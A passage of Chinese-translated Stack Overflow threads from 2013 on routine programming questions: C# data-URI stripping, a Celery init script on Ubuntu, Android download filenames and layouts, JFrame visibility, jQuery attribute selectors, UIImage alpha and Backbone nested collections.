> 赞同：1
> 
> 时间：2013-04-08T12:36:15.887

你只是在使用[`String.Replace`](http://msdn.microsoft.com/en-us/library/fk49wtc1%28v=vs.100%29.aspx)，但你应该使用[`Regex.Replace`](http://msdn.microsoft.com/en-us/library/system.text.regularexpressions.regex.replace%28v=vs.100%29.aspx)正则表达式。

* * *

但是为什么不直接使用[`Substring`](http://msdn.microsoft.com/en-us/library/system.string.substring%28v=vs.100%29.aspx)呢？

```
imageSrc = image.Substring(image.IndexOf(',') + 1) 
```

由于您知道您的字符串始终以 开头`data:image/...`，因此您根本不需要正则表达式。

保持简单，只取第一个之后的子字符串`,`。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-08T12:38:19.267

好吧，对于初学者来说，你的代码正在做`String.Replace`而不是`Regex.Replace`.

```
imageSrc = Regex.Replace(image, "data:image/(png|jpg|gif|jpeg|pjpeg|x-png);base64,", ""); 
```

但是对于这个用例来说，正则表达式相当繁重，为什么不把逗号后面的所有内容都取走呢？

```
imageSrc = image.SubString(image.IndexOf(",") + 1); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-08T12:40:28.277

String.Replace() 没有正则表达式的重载。请改用 Regex.Replace()。

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2013-04-08T12:41:39.490

您的正则表达式中有错误，您必须指定**?:**用于替代图像并使用正则表达式对象，因此：

```
Regex.Replace("data:image/(?:png|jpg|gif|jpeg|pjpeg|x-png);base64,", ""); 
```

它应该工作

# django - 芹菜文件夹在 Ubuntu 上的位置？

> ID：15879114
> 
> 赞同：1
> 
> 时间：2013-04-08T12:33:18.847
> 
> 标签：django, ubuntu, django-celery

我正在按照说明在生产中设置**djcelery**。

> 下载守护进程脚本： [https ://github.com/ask/celery/blob/master/contrib/generic-init.d/celeryd](https://github.com/ask/celery/blob/master/contrib/generic-init.d/celeryd)
> 
> 把它放在 /etc/init.d/celeryd

但是，我在 /etc/init.d/ 中没有一个名为**celeryd**的文件夹。

我正在运行 Ubuntu，如果我运行，芹菜就可以工作，`manage.py celeryd -l info`所以它的所有设置和安装都正确。

在 Ubuntu 上添加脚本的正确文件夹在哪里？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-08T12:36:36.967

他们的意思是“把它放进去`/etc/init.d/`” `celeryd`。既然已经命名了`celeryd`，就放进去`/etc/init.d`。

# android - 在webview中单击URL时如何获取文件名

> ID：15879119
> 
> 赞同：7
> 
> 时间：2013-04-08T12:33:39.397
> 
> 标签：android, android-webview, android-download-manager

当我们在页面中为该文件提供链接时，如何获取我们在服务器上上传的文件名？

我正在做的是，我在 webview 中提供带有文件链接的数据，因此每当用户单击链接时，都需要从服务器下载，因为我已经从服务器下载了此文件，但问题无法使用 DownloadManager 获取其确切类型和名称。我想要这样

![在此处输入图像描述](https://i.stack.imgur.com/UdzSb.png)

见上面，我在 test_androt 中给出了我的文件的链接，当我点击它时，会给出带有文件名选项的 dailog，当用户点击 WebView URL 链接时，我不知道如何实现这个文件名。

**编辑抱歉忘记提到我的网址看起来像这样**

```
misc/dnload.php?t1=MzQ0MDA=&t2=MTY5NTUz&t3=MTY5NTUzMTMwMjEyMDNfcGhhcm1hY3kga2V5IGluZm8ucG5n&t4=MTMwMjEyMDM= 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-04-08T17:16:21.650

您可以简单地解析 url 并获取最后一个“/”之后的文本并将其设为文件名，或者您可以使用以下内容

```
URLUtil.guessFileName(url, contentDisposition, mimetype); 
```

如下所示，因为我在我的 DownloadListener 中使用了它：

```
//this stuff goes inside your DownloadListener
@Override
public void onDownloadStart(final String url, String userAgent,final String contentDisposition, final String mimetype, long contentLength) 
{
    String fileName = URLUtil.guessFileName(url, contentDisposition, mimetype); //returns a string of the name of the file THE IMPORTANT PART

    //proceed with download
} 
```

如果您不想在您的 DownloadListener 中使用它，您可以在没有 contentDisposition 或 mimetype 的情况下使用它，只需为除 url 之外的每个参数传递“null”（也传递 url）。

编辑：这仅在您有一个嵌入了文件名的 url 时才有效。如果您正在寻找一种更简单的方法，请参阅上面的 Pratik 的答案。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2013-04-16T05:22:36.117

感谢 Raghunandan 的建议，我得到了答案。

在这里我需要额外调用来获取下载文件的标题信息。在标题部分，我得到了文件的名称。

我还发现这个[来自 URL 的文件名不包含文件名后缀](https://stackoverflow.com/q/13109147/760489)帖子，通过该帖子我获得了有关标题详细信息的更多详细信息，我们可以在请求时获得这些详细信息。

因为我们可以使用它`URLUtil.guessFileName(url, null, null)`，但这将为我的情况给出调用方法的文件名，我有这样的 url

```
misc/dnload.php?t1=MzQ0MDA=&t2=MTY5NTUz&t3=MTY5NTUzMTMwMjEyMDNfcGhhcm1hY3kga2V5IGluZm8ucG5n&t4=MTMwMjEyMDM= 
```

因此，从上面的链接中，这将提取**dnload.php**作为文件名，它不是我们下载的原始文件名，它只是为该文件创建了下载链接。

这是使用它的代码，我们可以获取文件名，它只是一个额外的调用来获取信息，但实际上我们下载，为了下载，我使用 android 内置 api 到 DownloadManager 来下载文件。

```
Content-Disposition this is the attribute in header section through which we can get the file name as in attachment form. 
```

它将以这种方式返回信息，`Content-Disposition: attachment; filename="fname.ext"`所以现在只需要提取文件名

```
class GetFileInfo extends AsyncTask<String, Integer, String>
{
    protected String doInBackground(String... urls)
    {
                URL url;
                String filename = null;
                try {
                    url = new URL(urls[0]);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.connect();
                conn.setInstanceFollowRedirects(false); 

                String depo = conn.getHeaderField("Content-Disposition");
                String depoSplit[] = depo.split("filename=");
                filename = depoSplit[1].replace("filename=", "").replace("\"", "").trim();
                } catch (MalformedURLException e1) {
                    e1.printStackTrace();
                } catch (IOException e) {
                }
            return filename;
    }

    @Override
    protected void onPreExecute() {
        super.onPreExecute();
    }
    @Override
    protected void onPostExecute(String result) {
        super.onPostExecute();
        // use result as file name
    }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2017-04-30T01:55:50.110

Pratik 解决方案的一些改进。

变化：

1) 修复了从 Content-Disposition 中提取损坏的文件名

2) 增加回调接口

用法：

```
new GetFileInfo(new GetFileInfoListener() {
    @Override
    public void onTaskCompleted(String fileName) {
        Log.v(TAG, "real filename is " + fileName);
    }
}).execute(url); 
```

代码：

```
class GetFileInfo extends AsyncTask<String, Integer, String>
{
    public interface GetFileInfoListener {
        void onTaskCompleted(String result);
    }

    private final GetFileInfoListener mListener;

    public GetFileInfo(GetFileInfoListener listener) {
        mListener = listener;
    }

    protected String doInBackground(String... urls)
    {
        URL url;
        String filename = null;
        try {
            url = new URL(urls[0]);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.connect();
            conn.setInstanceFollowRedirects(false);

            String depo = conn.getHeaderField("Content-Disposition");

            if (depo != null)
                 filename = depo.replaceFirst("(?i)^.*filename=\"?([^\"]+)\"?.*$", "$1");
            else
                 filename = URLUtil.guessFileName(urls[0], null, null);
        } catch (MalformedURLException e1) {
            e1.printStackTrace();
        } catch (IOException e) {
        }
        return filename;
    }

    @Override
    protected void onPreExecute() {
        super.onPreExecute();
    }
    @Override
    protected void onPostExecute(String result) {
        super.onPostExecute(result);
        if (mListener != null)
           mListener.onTaskCompleted(result);
    }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2018-06-04T13:18:04.687

这将从需要身份验证的服务器（通过 cookie）获取文件名。为此，您需要从服务器 content-disposition 标头中获取文件名，我们执行此异步操作（您不能在主线程中进行 http 调用），然后在使用文件名后传递一个类来下载文件。

文件名Util.java

```
public class FileNameUtil extends AsyncTask<String, Void, String> {

    private OnGetFileNameCompleted mListener;

    public FileNameUtil(OnGetFileNameCompleted listener) {
        super();
        mListener = listener;
    }

    @Override
    public String doInBackground(String... params) {

        String filename = null;

        try {
            URL url = new URL(params[0]);

            HttpURLConnection con = (HttpURLConnection) url.openConnection();
            con.setRequestProperty("Cookie", "PHPSESSID=" + WebService.sessionId);
            con.setRequestMethod("HEAD");
            con.setInstanceFollowRedirects(false);
            con.connect();

            String content = con.getHeaderField("Content-Disposition");

            String contentSplit[] = content.split("filename=");

            filename = contentSplit[1].replace("filename=", "").replace("\"", "").trim();

        } catch (Exception e) {
        }

        return filename;
    }

    @Override
    protected void onPreExecute() {
        super.onPreExecute();
    }

    @Override
    protected void onPostExecute(String filename) {
        super.onPostExecute(filename);
        mListener.processFinish(filename);
    }
} 
```

OnGetFileNameCompleted.java

```
public interface OnGetFileNameCompleted {

    void processFinish(String filename);
} 
```

Activty.java

```
 final Context c = this;

 row.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                final String url = "http://192.168.1.100/document.php?id=583";

                FileNameUtil fileNameUtil = new FileNameUtil(new OnGetFileNameCompleted() {

                        @Override
                        public void processFinish(String filename) {
                            try {
                                DownloadManager dm = (DownloadManager) context.getSystemService(DOWNLOAD_SERVICE);
                                DownloadManager.Request request = new DownloadManager.Request(Uri.parse(url));
                                request.addRequestHeader("Cookie", "PHPSESSID=" + WebService.sessionId);
                                dm.enqueue(request);

                                if (filename != null) {
                                    request.setDestinationInExternalPublicDir(Environment.DIRECTORY_DOWNLOADS, filename);
                                }

                                Intent i = new Intent();
                                i.setAction(DownloadManager.ACTION_VIEW_DOWNLOADS);
                                context.startActivity(i);
                            } catch (Exception e) {
                                showMessage(R.string.error, R.string.error_occurred);
                            }
                        }
                    });

                    fileNameUtil.execute(url);
            }
        }); 
```

# java - JFrame 可见性

> ID：15879120
> 
> 赞同：1
> 
> 时间：2013-04-08T12:33:41.133
> 
> 标签：java, swing, netbeans, jframe, visible

我尝试使用 netbeans IDE 制作一个 JFrame，并且所有代码都没有错误，当我尝试运行应用程序时，Frame 不可见。问题是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-08T12:35:18.587

我敢肯定你忘了写这段代码：

```
setVisible(true); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-08T12:45:04.990

在你做之前

```
setVisible(true); 
```

确保您创建了一个构造函数，例如：

```
public YourFrame(){
setVisible(true);
} 
```

我希望这可以帮助你。

* * *

## 回答 #3

> 赞同：-2
> 
> 时间：2020-11-08T14:00:47.497

在我尝试了所有解决方案但没有任何效果之后，我将按钮和文本框等单个对象复制到一个新表单中，并在每次添加后运行该表单。它终于奏效了。

# android - 为什么我的 2 个自定义视图布局相互重叠，尽管我使用的是 LinearLayout

> ID：15879122
> 
> 赞同：2
> 
> 时间：2013-04-08T12:33:42.867
> 
> 标签：android

我尝试在运行时添加到自定义视图。

## MainActivity.java

```
package com.example.bug;

import android.os.Bundle;
import android.app.Activity;
import android.view.Menu;
import android.view.View;
import android.view.ViewGroup;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        android.view.ViewGroup root = (android.view.ViewGroup)getWindow().getDecorView().findViewById(android.R.id.content);
        View v0 = this.getLayoutInflater().inflate(R.layout.custom_view, null);
        View v1 = this.getLayoutInflater().inflate(R.layout.custom_view, null);
        ((android.widget.TextView)v0.findViewById(R.id.textView1)).setText("Text view 1");
        ((android.widget.TextView)v1.findViewById(R.id.textView1)).setText("Text view 2");
        // I expect v1 will below v0 as we are using vertical LinearLayout.
        // However, they are overlapping each others.
        root.addView(v0);
        root.addView(v1);
    }
} 
```

## custom_view.xml

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="48dp"
    android:orientation="horizontal" >

    <TextView
        android:id="@+id/textView1"
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Large Text"
        android:textAppearance="?android:attr/textAppearanceLarge" />

    <EditText
        android:id="@+id/editText1"
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:ems="10" >
    </EditText>

</LinearLayout> 
```

## activity_main.xml

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical" >

</LinearLayout> 
```

但是，我不明白。我希望第二个视图将在第一个视图的底部。但是，我得到了重叠的结果。

## （通过Java方式完成）

![在此处输入图像描述](https://i.stack.imgur.com/905DJ.png)

有没有我做错了什么步骤？谢谢你。

请注意，如果我通过 XML 方式而不是 Java 添加 2 个自定义视图，则一切正常。但我仍然不明白为什么我的 Java 方式不起作用？

## activity_main.xml

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:orientation="vertical" >
    <include layout="@layout/custom_view"/>
    <include layout="@layout/custom_view"/>
</LinearLayout> 
```

## （通过 XML 方式进行）

![在此处输入图像描述](https://i.stack.imgur.com/LD8Iq.png)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-08T12:48:21.757

这是因为您没有将您`View`的 s 添加到您的`LinearLayout`in 中`activity_main.xml`，而是您添加到`ViewGroup`不是 a 的根目录中`LinearLayout`。直接引用您的`LinearLayout`并将它们添加到其中，如下所示：

## activity_main.xml

```
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:id="@+id/main_activity_linear_layout" >

</LinearLayout> 
```

## MainActivity.java

```
@Override
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_main);

    LinearLayout root = (LinearLayout) findViewById(R.id.main_activity_linear_layout);
    View v0 = this.getLayoutInflater().inflate(R.layout.custom_view, null);
    View v1 = this.getLayoutInflater().inflate(R.layout.custom_view, null);
    ((android.widget.TextView)v0.findViewById(R.id.textView1)).setText("Text view 1");
    ((android.widget.TextView)v1.findViewById(R.id.textView1)).setText("Text view 2");

    // I expect v1 will below v0 as we are using vertical LinearLayout.
    // However, they are overlapping each others.
    root.addView(v0);
    root.addView(v1);
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-08T12:46:05.450

我建议您在添加视图时在代码中明确指定线性布局参数（宽度和高度）：

```
View v0 = this.getLayoutInflater().inflate(R.layout.custom_view, null);
View v1 = this.getLayoutInflater().inflate(R.layout.custom_view, null);
...

LayoutParams lp = new LayoutParams(LayoutParams.WRAP_CONTENT, LayoutParams.WRAP_CONTENT);

root.addView(v0, lp);
root.addView(v1, lp); 
```

确保您正在导入`LinearLayout.LayoutParams`而不是`LayoutParams`从其他类导入。

# java - Android致命错误：主要

> ID：15879124
> 
> 赞同：0
> 
> 时间：2013-04-08T12:33:50.520
> 
> 标签：java, android, eclipse, android-listview, onclick

当我单击 Order 按钮时，此 CatalogActivity.java 显示致命错误。

```
package com.example.barcode;

import java.util.List;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.AdapterView;
import android.widget.AdapterView.OnItemClickListener;
import android.widget.Button;
import android.widget.ListView;

public class CatalogActivity extends Activity {

private List<Product> mProductList;
Button button;

 /** Called when the activity is first created. */
 @Override
 public void onCreate(Bundle savedInstanceState) {
super.onCreate(savedInstanceState);
setContentView(R.layout.catalog);

 // Obtain a reference to the product catalog
    mProductList = ShoppingCartHelper.getCatalog(getResources());

   // Create the list
   ListView listViewCatalog = (ListView) findViewById(R.id.ListViewCatalog);
   listViewCatalog.setAdapter(new ProductAdapter(mProductList, getLayoutInflater(),      false));

   listViewCatalog.setOnItemClickListener(new OnItemClickListener() {

   @Override
   public void onItemClick(AdapterView<?> parent, View view, int position,
     long id) {
    Intent productDetailsIntent = new         Intent(getBaseContext(),ProductDetailsActivity.class);
    productDetailsIntent.putExtra(ShoppingCartHelper.PRODUCT_INDEX, position);
    startActivity(productDetailsIntent);
   }
  });

   Button viewShoppingCart = (Button) findViewById(R.id.ButtonViewCart);
   viewShoppingCart.setOnClickListener(new OnClickListener() {

   @Override
   public void onClick(View v) {
    Intent viewShoppingCartIntent = new Intent(getBaseContext(), ShoppingCartActivity.class);
    startActivity(viewShoppingCartIntent);
   }
  });

 }
} 
```

* * *

```
04-08 12:25:17.893: W/KeyCharacterMap(478): No keyboard for id 0
04-08 12:25:17.893: W/KeyCharacterMap(478): Using default keymap: /system/usr/keychars/qwerty.kcm.bin
04-08 12:25:22.663: D/AndroidRuntime(478): Shutting down VM
04-08 12:25:22.673: W/dalvikvm(478): threadid=1: thread exiting with uncaught exception (group=0x40015560)
04-08 12:25:22.693: E/AndroidRuntime(478): FATAL EXCEPTION: main
04-08 12:25:22.693: E/AndroidRuntime(478): java.lang.IllegalStateException: Could not execute method of the activity
04-08 12:25:22.693: E/AndroidRuntime(478):  at android.view.View$1.onClick(View.java:2144)
04-08 12:25:22.693: E/AndroidRuntime(478):  at android.view.View.performClick(View.java:2485)
04-08 12:25:22.693: E/AndroidRuntime(478):  at android.view.View$PerformClick.run(View.java:9080)
04-08 12:25:22.693: E/AndroidRuntime(478):  at android.os.Handler.handleCallback(Handler.java:587)
04-08 12:25:22.693: E/AndroidRuntime(478):  at android.os.Handler.dispatchMessage(Handler.java:92)
04-08 12:25:22.693: E/AndroidRuntime(478):  at android.os.Looper.loop(Looper.java:123)
04-08 12:25:22.693: E/AndroidRuntime(478):  at android.app.ActivityThread.main(ActivityThread.java:3683)
04-08 12:25:22.693: E/AndroidRuntime(478):  at java.lang.reflect.Method.invokeNative(Native Method)
04-08 12:25:22.693: E/AndroidRuntime(478):  at java.lang.reflect.Method.invoke(Method.java:507)
04-08 12:25:22.693: E/AndroidRuntime(478):  at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:839)
04-08 12:25:22.693: E/AndroidRuntime(478):  at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:597)
04-08 12:25:22.693: E/AndroidRuntime(478):  at dalvik.system.NativeStart.main(Native Method)
04-08 12:25:22.693: E/AndroidRuntime(478): Caused by: java.lang.reflect.InvocationTargetException
04-08 12:25:22.693: E/AndroidRuntime(478):  at java.lang.reflect.Method.invokeNative(Native Method)
04-08 12:25:22.693: E/AndroidRuntime(478):  at java.lang.reflect.Method.invoke(Method.java:507)
04-08 12:25:22.693: E/AndroidRuntime(478):  at android.view.View$1.onClick(View.java:2139)
04-08 12:25:22.693: E/AndroidRuntime(478):  ... 11 more
04-08 12:25:22.693: E/AndroidRuntime(478): Caused by: android.content.ActivityNotFoundException: Unable to find explicit activity class {com.example.barcode/com.example.barcode.CatalogActivity}; have you declared this activity in your AndroidManifest.xml?
04-08 12:25:22.693: E/AndroidRuntime(478):  at android.app.Instrumentation.checkStartActivityResult(Instrumentation.java:1405)
04-08 12:25:22.693: E/AndroidRuntime(478):  at android.app.Instrumentation.execStartActivity(Instrumentation.java:1379)
04-08 12:25:22.693: E/AndroidRuntime(478):  at android.app.Activity.startActivityForResult(Activity.java:2827)
04-08 12:25:22.693: E/AndroidRuntime(478):  at android.app.Activity.startActivity(Activity.java:2933)
04-08 12:25:22.693: E/AndroidRuntime(478):  at com.example.barcode.Barcodemain.Order(Barcodemain.java:30)
04-08 12:25:22.693: E/AndroidRuntime(478):  ... 14 more 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-08T12:36:43.673

添加到清单以下行：

```
<activity android:name="com.example.barcode.CatalogActivity" /> 
```

# javascript - 如果链接包含特定文本，则jQuery将类添加到href

> ID：15879130
> 
> 赞同：7
> 
> 时间：2013-04-08T12:34:13.980
> 
> 标签：javascript, jquery, append, href

我的网站列表中有一些动态填充的链接，这些链接链接到文件。是否可以使用 jQuery 查看文件名是否以 .pdf 结尾，如果链接文本以 .mp3 结尾，则向 href 或类似内容添加一个类？

例如，我的列表中有以下链接：

*   文档1.pdf
*   歌曲1.mp3
*   歌曲2.m4a
*   文档2.doc

我想检测结尾字母并向链接添加不同的类，因此对于具有文本 Document1.pdf 的链接，我将类添加`pdf`到锚元素，并将带有文本 Song1.mp3 的链接添加将类添加`mp3`到锚元素。

* * *

## 回答 #1

> 赞同：35
> 
> 时间：2013-04-08T12:36:30.367

使用属性选择器：

```
$('a[href$=".mp3"]')... 
```

选项：

```
    属性包含前缀选择器 [name|="value"]
    选择具有指定属性和值的元素
    等于给定字符串或以该字符串开头
    用连字符 (-)。

    属性包含选择器 [name*="value"]
    选择具有指定属性的元素
    包含给定子字符串的值。

    属性包含单词选择器 [name~="value"]
    选择具有指定属性和值的元素
    包含给定的单词，由空格分隔。

    属性以选择器结尾 [name$="value"]
    选择具有指定属性的元素
    以给定字符串结尾的值。比较区分大小写。

    属性等于选择器 [name="value"]
    选择具有指定属性的元素
    值完全等于某个值。

    属性不等于选择器 [name!="value"]
    选择不具有指定属性的元素，
    或者确实具有指定的属性但没有特定的值。

    属性以选择器 [name^="value"] 开头
    选择具有指定属性的元素
    值正好以给定的字符串开头。

    具有属性选择器 [名称]
    选择具有指定属性且具有任何值的元素。

    多属性选择器 [name="value"][name2="value2"]
    匹配与所有指定属性过滤器匹配的元素。

```

[查看 API](http://api.jquery.com/category/selectors/attribute-selectors/)以获取更多信息。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-08T12:44:12.263

鉴于您的所有此类链接都有课程`.file`

```
var exts = ['pdf','xls'];
$('a.file').each(function(){
    if($(this).attr('href').match(new RegExp('('+exts.join('|')+')'), 'gi'))
        $(this).addClass($(this).attr('href').match(/\w{3}$/gi)[0]);
}) 
```

此代码会将*扩展*`exts`类添加到数组中具有文件扩展名的所有此类链接。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-08T12:45:24.003

除了对所有类型进行硬编码之外，您还可以制定一个解决方案，自动为所有链接执行此操作：

```
var regex = "/\..{3,4}$/";
$('a').each(function() {
    $(this).addClass(regex.match($(this).attr("href"))[0]
}); 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2013-04-08T12:37:37.800

```
$('a[href$=".mp3"]').addClass("mp3");
$('a[href$=".pdf"]').addClass("pdf"); 
```

# ios - 来自 UIColor 的带有 alpha 的 UIImage

> ID：15879133
> 
> 赞同：16
> 
> 时间：2013-04-08T12:34:18.307
> 
> 标签：ios, uibutton, uiimage, uicolor

我正在尝试从我拥有的这个 UIColor 值创建一个 UIImage 。UIImage 正在创建，但 alpha 值丢失。图像保持不透明。我正在使用以下代码：

```
@implementation GetImage

+ (UIImage *)imageWithColor:(UIColor *)color andSize:(CGSize)size
{
    UIImage *img = nil;

    CGRect rect = CGRectMake(0, 0, size.width, size.height);
    UIGraphicsBeginImageContext(rect.size);
    CGContextRef context = UIGraphicsGetCurrentContext();
    CGContextSetFillColorWithColor(context,
                               color.CGColor);
    CGContextFillRect(context, rect);

    img = UIGraphicsGetImageFromCurrentImageContext();

    UIGraphicsEndImageContext();

    return img;
}

@end 
```

我这样称呼：

```
-(void) setButtonColours{

    UIImage *img1, *img2;

    UIColor *red = [UIColor colorWithRed:205.0/255.0 green:68.0/255.0 blue:51.0/255.0 alpha:1.0],
    *blue = [UIColor colorWithRed:71.0/255.0 green:97.0/255.0 blue:151.0/255.0 alpha:1.0];

    img1 = [GetImage imageWithColor: blue andSize: self.dummyButton.frame.size];

    img2 = [GetImage imageWithColor: red andSize: self.dummyButton.frame.size];

    [self.dummyButton setBackgroundImage: img1 forState:UIControlStateNormal];
    [self.dummyButton setBackgroundImage: img2 forState:UIControlStateSelected];

} 
```

知道我错过了什么吗？

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2013-04-08T12:38:18.930

您正在创建一个不透明的图像上下文。

替换这一行：

```
UIGraphicsBeginImageContext(rect.size); 
```

和：

```
UIGraphicsBeginImageContextWithOptions(rect.size, NO, 0); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-09-25T18:27:47.143

如果有人发现这个问题并且他们正在寻找 Monotouch 实现：

```
 public class ColorRGBA
        {
            public float Red=0;
            public float Green=0;
            public float Blue=0;
            public float Alpha=0;

            public ColorRGBA (float red, float green, float blue, float alpha)
            {
                Red = red;
                Green = green;
                Blue = blue;
                Alpha = alpha;
            }
        }

//then from within a custom mt.d element

private ColorRGBA color;

    public override UITableViewCell GetCell (UITableView tv)
                {
                    //create square with color
                    var imageSize = new SizeF(30, 30);
                    var imageSizeRectF = new RectangleF (0, 0, 30, 30);
                    UIGraphics.BeginImageContextWithOptions (imageSize, false, 0);
                    var context = UIGraphics.GetCurrentContext ();
                    context.SetFillColor (color.Red, color.Green, color.Blue, color.Alpha);
                    context.FillRect (imageSizeRectF);
                    var image = UIGraphics.GetImageFromCurrentImageContext ();
                    UIGraphics.EndImageContext ();

                    var cell = base.GetCell(tv);
                    cell.Accessory = UITableViewCellAccessory.DisclosureIndicator;
                    cell.ImageView.Image = image;

                    return cell;
                } 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2018-04-03T17:48:50.970

对于那些感兴趣的人，这里是 Swift 4+ 中的一个简单重写：

```
import UIKit

extension UIImage {
  class func colorAsImage(from color:UIColor, for size:CGSize) -> UIImage? {
    var img:UIImage?
    let rect = CGRect(x:0.0, y:0.0, width: size.width, height: size.height)
    UIGraphicsBeginImageContextWithOptions(rect.size, false, 0)
    guard let context = UIGraphicsGetCurrentContext() else { return nil }
    context.setFillColor(color.cgColor)
    context.fill(rect)
    img = UIGraphicsGetImageFromCurrentImageContext()
    UIGraphicsEndImageContext()
    guard let colorImage = img else { return nil }
    return colorImage
  }
} 
```

# templates - 使用 Underscore 和 Backbone 在模板中获取模型的子集合

> ID：15879134
> 
> 赞同：0
> 
> 时间：2013-04-08T12:34:18.277
> 
> 标签：templates, backbone.js, requirejs, underscore.js

我有一个像这样的 JSON，它是一系列问题：

```
{
            "id": "505",
            "issuedate": "2013-01-15 06:00:00",
            "lastissueupdate": "2013-01-15 13:51:08",
            "epub": false,
            "pdf": true,
            "price": 3,
            "description": "Diese Version ist nur als PDF verfügbar.",
            "downloadable": true,
            "renderings": [
                {
                    "height": 976,
                    "width": 1024,
                    "sourcetype": "pdf",
                    "pagenr": 0,
                    "purpose": "newsstand",
                    "relativePath": null,
                    "size": 0,
                    "url": "a/url/image.jpg"
                },
                {
                    "height": 488,
                    "width": 512,
                    "sourcetype": "pdf",
                    "pagenr": 0,
                    "purpose": "newsstand",
                    "relativePath": null,
                    "size": 0,
                    "url": "a/url/image.jpg"
                }
} 
```

我正在使用主干，我想访问子元素（渲染）。我覆盖了 parse 方法来告诉我我的“渲染”是一个新的集合，这部分工作正常。当我在模板中传递我的问题集合时，我遇到了一些问题。然后我可以为每个问题制作一个并访问他的属性（id、issuedate、lastissueupdate 等），但是我怎样才能访问我的问题的渲染？

我的观点：

```
define([
  'jquery',
  'underscore',
  'backbone',
  'text!templates/home/homeTemplate.html',
  'collections/issues/IssueCollection'
], function($, _, Backbone, homeTemplate, IssueCollection){

  var HomeView = Backbone.View.extend({
    el: $("#page"),

    initialize:function(){
      var that = this;

      var onDataHandler = function(issues){
        that.render();

      }
      this.issues = new IssueCollection();
      this.issues.fetch({
        success:onDataHandler, 
        error:function(){
          alert("nicht gut")
        }
      });
    },

    render: function(){

      $('.menu li').removeClass('active');
      $('.menu li a[href="#"]').parent().addClass('active');
      var compiledTemplate = _.template(homeTemplate, {_:_, issues: this.issues.models});
      this.$el.html(compiledTemplate);

    }

  });

  return HomeView;

}); 
```

然后我有一个非常基本的模板。

要恢复，我有一个模型 ISSUE 的集合问题，其中包含一个渲染集合，我想在我的模板中访问模型渲染。

编辑： **问题集合**

```
define([
    'underscore',
    'backbone',
    'models/issue/IssueModel'
], function(_, Backbone, IssueModel){

    var IssueCollection = Backbone.Collection.extend({

        model: IssueModel,

        url: function(){
            return '/padpaper-ws/v1/pp/fn/issues';
        },

        parse: function(response){
            return response.issues;
        }

        //initialize : function(models, options) {},

    });
    return IssueCollection;
}); 
```

**问题模型**

```
define([
  'underscore',
  'backbone',
  'collections/renderings/RenderingsCollection'
], function(_, Backbone, RenderingsCollection) {

  var IssueModel = Backbone.Model.extend({
    parse: function(response){
      response.renderings = new RenderingsCollection(response.renderings);
      return response;
     },
    set: function(attributes, options) {
      if (attributes.renderings !== undefined && !(attributes.renderings instanceof RenderingsCollection)) {
        attributes.renderings = new RenderingsCollection(attributes.renderings);
      }
      return Backbone.Model.prototype.set.call(this, attributes, options);
    }
  });
  return IssueModel;
}); 
```

**渲染集合**

```
define([
    'underscore',
    'backbone',
    'models/rendering/RenderingModel'
], function(_, Backbone, RenderingModel){

    var RenderingsCollection = Backbone.Collection.extend({

        model: RenderingModel

        //initialize : function(models, options) {},

    });
    return RenderingsCollection;
}); 
```

**渲染模型**

```
define([
  'underscore',
  'backbone'
], function(_, Backbone) {

  var RenderingModel = Backbone.Model.extend({

  return RenderingModel;

}); 
```

谢谢 ！！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-08T13:11:02.820

您可以使用[Collection#toJSON](http://backbonejs.org/#Collection-toJSON)方法来完整表示您的整个数据。不过，您必须使用`model.attributes.key`来访问模型的属性。所以我不太推荐它。相反，我会说您应该构建自己的 JSON 对象（递归地使用 toJSON 方法）。（如果不清楚，我会用一些代码更新）

**编辑：**

```
var data = [], renderings;
for(var i=0; i<issues.length; i++) {
  data.push(issues.models[i].toJSON());
  data[i].renderings = [];
  renderings = issues.models[i].get('renderings');
  for(var j=0; j<renderings.length; j++) {
    data[i].renderings.push(renderings.models[j].toJSON());
  }
} 
```

例如会给你整个数据，你可以很容易地访问任何属性。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-11T07:37:46.907

实际上，我可以像这样在我的模板中使用双 _.each，从视图中给出我的模型。

```
<% _.each(issues, function(issue) { %>
    .... code ...
